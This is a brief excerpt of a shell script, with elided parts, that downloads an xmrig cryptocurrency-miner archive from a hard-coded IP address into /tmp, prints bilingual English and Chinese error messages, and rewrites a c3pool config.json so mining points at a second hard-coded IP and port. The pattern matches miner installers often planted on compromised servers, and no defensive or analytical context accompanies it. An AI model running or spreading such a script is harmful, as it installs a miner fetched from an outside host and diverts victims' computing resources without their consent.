...
if ! curl -L --progress-bar "http://129.226.180.53/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://129.226.180.53/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo "发生错误: 无法下载 http://129.226.180.53/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi
...
sed -i 's/"url": *"[^"]*",/"url": "8.214.121.254:'$PORT'",/' $HOME/c3pool/config.json
